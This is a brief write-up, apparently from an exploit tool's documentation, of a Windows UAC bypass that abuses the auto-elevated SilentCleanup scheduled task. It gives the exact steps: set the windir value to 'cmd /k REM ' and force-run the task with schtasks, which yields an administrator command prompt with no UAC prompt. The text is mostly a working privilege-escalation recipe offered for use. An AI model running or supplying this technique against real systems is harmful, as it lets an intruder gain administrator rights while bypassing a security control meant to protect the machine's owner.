    There is an auto-elevated task called SilentCleanup located in %windir%\system32\cleanmgr.exe
    This can be abused to elevate any file with Administrator privileges without prompting
    UAC (even highest level).


    For example, we can set the windir registry kye to: "cmd /k REM "


    And forcefully run SilentCleanup task:


    schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I


    REM will tell it to ignore everything after %windir% and treat it just as a NOTE.
    Therefore just executing cmd with admin privs.'
